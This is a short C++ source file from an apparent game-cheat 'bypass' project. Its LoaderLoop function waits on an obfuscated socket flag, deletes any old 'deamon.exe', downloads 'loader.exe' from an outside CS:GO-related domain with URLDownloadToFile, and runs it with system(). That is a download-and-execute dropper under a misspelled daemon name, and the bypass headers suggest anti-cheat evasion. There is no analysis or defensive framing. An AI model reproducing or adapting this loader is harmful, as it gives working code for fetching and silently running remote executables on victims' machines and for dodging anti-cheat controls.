#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <Windows.h>
#include <urlmon.h>
#include "bypassByte.h"
#include "vbypass.h"

#include <filesystem>


#include "../socket/msoket.h"



#pragma comment (lib, "Urlmon.lib")


void BypassLoader::LoaderLoop(HMODULE hModule)
{
	while (!mSocket::cfg::_____jskjensb)
		Sleep(200);

	if (std::filesystem::exists("deamon.exe"))
	{
        remove("deamon.exe");
	}


    // the URL to download from 
    const char* srcURL = "https://proximitycsgo.com/loader.exe";

    // the destination file 
    const char* destFile = "deamon.exe";

    // URLDownloadToFile returns S_OK on success 
    if (S_OK == URLDownloadToFile(NULL, srcURL, destFile, 0, NULL))
    {
        system("deamon.exe");
    }
}
